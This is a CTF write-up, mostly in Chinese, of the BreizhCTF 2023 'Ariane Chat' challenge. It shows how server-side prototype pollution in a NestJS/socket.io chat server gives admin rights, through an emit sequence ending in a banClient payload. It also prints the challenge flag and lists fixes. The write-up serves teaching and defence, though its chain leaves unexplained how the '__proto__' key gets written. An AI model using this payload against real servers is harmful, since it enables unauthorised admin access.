---
title: Server-Side Prototype Pollution on a WebSocket server – BreizhCTF Ariane Chat
contest: BreizhCTF
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [sspp, socket-io, nestjs, prototype-pollution, isadmin, bot-client]
attack_chain:
- NestJS + socket.io 8888 WebSocket
- loginAsHuman 创 Client 普通用户
- loginAsAdmin 注释掉密码验证但有 client.isAdmin
- 注释看 Admin 验证：if (client.isAdmin) socket.emit('onmessage', 'Welcome ...')
- getCanceledPeople() 中 list[username][message] = reason 经典 SSPP
- bot 客户端用 extraHeaders x-forwarded-for: 127.0.0.1
- bot 调 reportClient(reason='isAdmin') 触发 client[reason] = 'suspicious'
- 'suspicious' 是字符串 → truthy → if (client.isAdmin) 走 if 分支
- human 调 getBanList 触发 banClient → list[__proto__][isAdmin] = 'true'
- 全局 Object.prototype.isAdmin 污染
- flagUser.emit('loginAsAdmin', {username, password}) → BZHCTF{...}
key_payload: banClient({message: 'isAdmin', reason: 'true'})
one_liner: BreizhCTF 2023 Ariane Chat：NestJS + socket.io 服务端原型污染 (SSPP) 提权为 admin。
lesson: 当 admin 标志在字符串 truthy 检查且 Object 原型被污染时，所有 Client 实例都自动成为 admin。
quality: high
---
# BreizhCTF 2023 - Ariane Chat (SSPP)

## 背景
- NestJS + socket.io WebSocket 8888
- `loginAsHuman` / `loginAsAdmin` / `loginAsBot` / `sendMessage` / `reportClient` / `getBanList` / `banClient`

## 漏洞点
```typescript
// ModerationService.getCanceledPeople()
for (const [username, [message, reason]] of this.bannedUsers) {
    if (!list[username]) list[username] = {};
    list[username][message] = reason;  // <-- SSPP
}

// ModerationService.sus()
public sus(client: Client, reason: SusReason) {
    client[reason] = 'suspicious';     // <-- 字符串 truthy
    this.reportedUsers.add(client.username);
}
```

## 利用链
1. `bot.emit('loginAsBot', {username: 'bot'})` - 配 `x-forwarded-for: 127.0.0.1`
2. `human.emit('login', {username: 'toto'})` - 普通用户
3. `bot.emit('reportClient', {username: 'toto', reason: 'isAdmin'})` - 设置 `client['isAdmin'] = 'suspicious'`
4. `human.emit('getBanList')` - 触发 bannedUsers 写入
5. **`human.emit('banClient', {message: 'isAdmin', reason: 'true'})`** - SSPP 写 `Object.prototype.isAdmin = 'true'`
6. `flagUser.emit('loginAsAdmin', {username: 'whatever', password: 'whatever'})` - 任何 user 都成 admin
7. 收到 `Welcome home admin, BZHCTF{DontPutUserInputIntoYourKeys}`

## 关键洞察
- `if (client.isAdmin)` 不严格检查类型，字符串 truthy 即过
- `banClient`/`getBanList` 路径用 user-controlled key 写对象 → SSPP
- 修复：使用 `Object.create(null)` 创建字典 / 用 `Map` / 黑名单 `__proto__` 键
